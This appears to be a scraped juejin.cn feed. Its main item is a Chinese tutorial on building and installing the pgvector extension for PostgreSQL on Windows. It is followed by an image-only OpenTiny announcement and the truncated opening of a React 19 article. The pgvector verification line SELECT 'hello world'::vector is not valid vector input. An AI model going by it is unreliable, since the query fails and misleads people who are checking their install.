  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-15T09:33:25.000Z" title="Thu Jan 15 2026 09:33:25 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-15
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    2
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">一、pgvector 是什么？为什么需要它？</h2>
<p><code>pgvector</code> 是 PostgreSQL 的扩展插件，让你在数据库里直接存储和查询<strong>高维向量</strong>。典型场景：</p>
<ul>
<li>用大模型（OpenAI、BERT）生成文本Embedding</li>
<li>图片相似搜索</li>
<li>推荐系统</li>
</ul>
<p><strong>核心功能</strong>：</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- 存储 1536 维向量</span>
<span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> documents (embedding vector(<span class="hljs-number">1536</span>));

<span class="hljs-comment">-- 相似度搜索（自动用索引加速）</span>
<span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> documents <span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> embedding <span class="hljs-operator">&lt;=&gt;</span> <span class="hljs-string">'[0.1, 0.2, ...]'</span> LIMIT <span class="hljs-number">10</span>;
</code></pre>
<hr/>
<h2 data-id="heading-1">二、前置条件检查</h2>
<p>开始之前，确认你的环境：</p>

























<table><thead><tr><th>项目</th><th>建议版本</th><th>检查命令</th></tr></thead><tbody><tr><td>PostgreSQL</td><td><strong>15 或 16</strong>（18 太新，兼容性差）</td><td><code>SELECT version();</code></td></tr><tr><td>端口</td><td>默认 5432（你的可能是 5433）</td><td><code>netstat -ano | findstr "5432"</code></td></tr><tr><td>Visual Studio</td><td>2022 社区版（免费）</td><td>见下文</td></tr></tbody></table>
<p><strong>⚠️ 避坑提示</strong>：如果你看到端口是 <strong>5433</strong>，说明安装时 5432 被占用了。本文所有配置文件请用 <strong>5433</strong>。</p>
<hr/>
<h2 data-id="heading-2">三、安装 Visual Studio 编译工具（精简版）</h2>
<p>pgvector 是 C 语言写的，需要编译。但不用装完整 VS，<strong>3 个组件就够</strong>：</p>
<ol>
<li><strong>适用于 x64/x86 的 MSVC 生成工具(最新版)</strong>（核心编译器）</li>
<li><strong>Windows 11 SDK</strong>（系统头文件）</li>
<li><strong>用于 Windows 的 C++ CMake 工具</strong>（构建工具）</li>
</ol>
<p><strong>安装步骤</strong>：</p>
<ol>
<li>访问 <a href="https://link.juejin.cn?target=https%3A%2F%2Fvisualstudio.microsoft.com%2Fvisual-cpp-build-tools%2F" target="_blank" title="https://visualstudio.microsoft.com/visual-cpp-build-tools/" ref="nofollow noopener noreferrer">Visual Studio 下载页</a></li>
<li>下载 <strong>Build Tools for Visual Studio 2022</strong></li>
<li>安装时<strong>只勾选上述 3 项</strong>，其他全取消</li>
<li>总大小约 <strong>2GB</strong>（完整版 10GB+）</li>
</ol>
<hr/>
<h2 data-id="heading-3">四、下载 pgvector 源码</h2>
<p>访问 GitHub Releases 页面：
<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fpgvector%2Fpgvector%2Freleases" target="_blank" title="https://github.com/pgvector/pgvector/releases" ref="nofollow noopener noreferrer">github.com/pgvector/pg…</a></p>
<p>下载 <strong>最新稳定版</strong>（比如 <code>v0.8.0.zip</code>），解压到短路径（建议 <code>C:\code\pgvector-0.8.0</code>）。</p>
<hr/>
<h2 data-id="heading-4">五、编译安装（关键步骤）</h2>
<h3 data-id="heading-5"><strong>步骤 1：打开编译环境</strong></h3>
<p>在开始菜单搜索 <strong>"x64 Native Tools Command Prompt for VS 2022"</strong>，<strong>右键 → 以管理员身份运行</strong>。</p>
<h3 data-id="heading-6"><strong>步骤 2：执行编译命令</strong></h3>
<p>依次输入以下命令（根据你的实际路径修改）：</p>
<pre><code class="hljs language-cmd" lang="cmd">:: 1. 进入源码目录
cd C:\code\pgvector-0.8.0

:: 2. 设置 PostgreSQL 路径（注意版本号）
set "PGROOT=C:\Program Files\PostgreSQL\15"

:: 3. 编译（如果端口是 5433，这里不用改）
nmake /F Makefile.win

:: 4. 安装到 PostgreSQL
nmake /F Makefile.win install
</code></pre>
<p><strong>成功标志</strong>：</p>
<ul>
<li>没有 <code>fatal error U1077</code></li>
<li>最后一行显示 <code>Install file: "..."</code></li>
</ul>
<hr/>
<h2 data-id="heading-7">六、验证安装</h2>
<p>在 <code>psql</code> 或 DBeaver 里执行：</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- 查看是否可用</span>
<span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> pg_available_extensions <span class="hljs-keyword">WHERE</span> name <span class="hljs-operator">=</span> <span class="hljs-string">'vector'</span>;

<span class="hljs-comment">-- 创建扩展（每个数据库只需一次）</span>
<span class="hljs-keyword">CREATE</span> EXTENSION vector;

<span class="hljs-comment">-- 验证</span>
<span class="hljs-keyword">SELECT</span> <span class="hljs-string">'hello world'</span>::vector;
</code></pre>
<p>如果返回向量值，说明安装成功！</p>
<hr/>
<h2 data-id="heading-8">七、常见问题与解决方案</h2>
<h3 data-id="heading-9"><strong>问题 1：<code>extension "vector" is not available</code></strong></h3>
<p><strong>原因</strong>：扩展没编译成功，或装到了错误的 PostgreSQL 版本。</p>
<p><strong>解决</strong>：</p>
<pre><code class="hljs language-cmd" lang="cmd">-- 清理后重新编译
nmake /F Makefile.win clean
nmake /F Makefile.win
nmake /F Makefile.win install
</code></pre>
<h3 data-id="heading-10"><strong>问题 2：<code>vacuum_delay_point</code> 参数错误</strong></h3>
<p><strong>原因</strong>：PostgreSQL 18（开发版）与 pgvector 不兼容。</p>
<p><strong>解决</strong>：<strong>降级到 PostgreSQL 15/16</strong>，或用预编译 DLL（见下文）。</p>
<h3 data-id="heading-11"><strong>问题 3：编译太麻烦</strong></h3>
<p><strong>终极方案</strong>：用 <strong>预编译 DLL</strong>（适合懒人）</p>
<ol>
<li>下载 <code>vector.dll</code> 和 <code>vector.control</code>：
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fpgvector%2Fpgvector%2Fissues%2F122%23issuecomment-1596093527" target="_blank" title="https://github.com/pgvector/pgvector/issues/122#issuecomment-1596093527" ref="nofollow noopener noreferrer">GitHub Issue #122 评论</a></li>
</ul>
</li>
<li>复制到：
<ul>
<li><code>C:\Program Files\PostgreSQL\15\lib\vector.dll</code></li>
<li><code>C:\Program Files\PostgreSQL\15\share\extension\vector.control</code></li>
</ul>
</li>
<li>重启服务</li>
</ol>
<hr/>
<h2 data-id="heading-12">八、完整流程图</h2>
<pre><code class="hljs language-sql" lang="sql">下载 pgvector → 安装 VS 精简组件 → 打开 x64 命令行 → 
设置 PGROOT 路径 → nmake 编译 → nmake 安装 → 
<span class="hljs-keyword">CREATE</span> EXTENSION → 验证成功
</code></pre>
<hr/></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[OpenTiny 2025年度贡献者榜单正式公布~]]></title>    <link>https://juejin.cn/post/7595147176752775168</link>    <guid>https://juejin.cn/post/7595147176752775168</guid>    <pubDate>2026-01-15T08:04:23.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7595147176752775168" data-draft-id="7595232643464298530" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="OpenTiny 2025年度贡献者榜单正式公布~"/> <meta itemprop="keywords" content="前端,Vue.js,JavaScript"/> <meta itemprop="datePublished" content="2026-01-15T08:04:23.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="OpenTiny社区"/> <meta itemprop="url" content="https://juejin.cn/user/3808325101432983"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            OpenTiny 2025年度贡献者榜单正式公布~
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3808325101432983/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    OpenTiny社区
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-15T08:04:23.000Z" title="Thu Jan 15 2026 08:04:23 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-15
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读1分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/692b02ec164d46bd8eac686ba2206c4d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgT3BlblRpbnnnpL7ljLo=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769069063&amp;x-signature=b9RKfLDvqWVs8YCcd50VV4KsM%2F8%3D" alt="OpenTiny2025年年度贡献者.png" loading="lazy"/></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[一文搞懂——React 19到底更新了什么]]></title>    <link>https://juejin.cn/post/7595185093833900067</link>    <guid>https://juejin.cn/post/7595185093833900067</guid>    <pubDate>2026-01-15T08:12:24.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7595185093833900067" data-draft-id="7595289498445037594" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="一文搞懂——React 19到底更新了什么"/> <meta itemprop="keywords" content="前端,React.js,前端框架"/> <meta itemprop="datePublished" content="2026-01-15T08:12:24.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="天天扭码"/> <meta itemprop="url" content="https://juejin.cn/user/3349589831715801"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            一文搞懂——React 19到底更新了什么
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3349589831715801/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    天天扭码
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-15T08:12:24.000Z" title="Thu Jan 15 2026 08:12:24 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-15
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读15分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">前言</h2>
<p>在2024年12月5日 React19正式版在npm上发布</p>
<h2 data-id="heading-1">一、性能提升进入自动化时代——核心更新</h2>
<h3 data-id="heading-2">告别useMemo、useCallback、React.memo</h3>
<p>在React18及以前，为了性能，你得小心翼翼地给函数和计算结果包上 <code>useMemo</code> 或 <code>useCallback</code>，还要盯着那个烦人的依赖数组，写错一个就出 Bug。</p>
<p>但是在React19推出了 <strong>React Compiler</strong>。它就像一个聪明的助手，在后台自动帮你分析哪些组件需要缓存。你只需要写正常的 JS 代码，性能优化交给编译器，代码量瞬间少了一大截。</p>
<p>下面我们可以看一个例子——</p>
<p><strong>React18的写法</strong></p>
<pre><code class="hljs language-jsx" lang="jsx"><span class="hljs-keyword">function</span> <span class="hljs-title function_">ProductList</span>(<span class="hljs-params">{ products, filterTerm }</span>) {
  <span class="hljs-comment">// 1. 必须手动包裹 useMemo，否则每次渲染都会重新计算</span>
  <span class="hljs-comment">// 2. 必须死盯着这个 [products, filterTerm] 依赖数组，漏写一个就出 Bug</span>
  <span class="hljs-keyword">const</span> filteredProducts = <span class="hljs-title function_">useMemo</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"正在执行繁重的过滤逻辑..."</span>);
    <span class="hljs-keyword">return</span> products.<span class="hljs-title function_">filter</span>(<span class="hljs-function"><span class="hljs-params">p</span> =&gt;</span> p.<span class="hljs-property">name</span>.<span class="hljs-title function_">includes</span>(filterTerm));
  }, [products, filterTerm]); 

  <span class="hljs-comment">// 3. 传给子组件的函数，必须包裹 useCallback，否则子组件会跟着瞎重绘</span>
  <span class="hljs-keyword">const</span> handlePurchase = <span class="hljs-title function_">useCallback</span>(<span class="hljs-function">(<span class="hljs-params">id</span>) =&gt;</span> {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"购买商品:"</span>, id);
  }, []);

  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">ul</span>&gt;</span>
      {filteredProducts.map(p =&gt; (
        <span class="hljs-tag">&lt;<span class="hljs-name">Item</span> <span class="hljs-attr">key</span>=<span class="hljs-string">{p.id}</span> <span class="hljs-attr">product</span>=<span class="hljs-string">{p}</span> <span class="hljs-attr">onPurchase</span>=<span class="hljs-string">{handlePurchase}</span> /&gt;</span>
      ))}
    <span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span></span>
  );
}
</code></pre>
<p><strong>React19的写法</strong></p>
<pre><code class="hljs language-jsx" lang="jsx"><span class="hljs-keyword">function</span> <span class="hljs-title function_">ProductList</span>(<span class="hljs-params">{ products, filterTerm }</span>) {
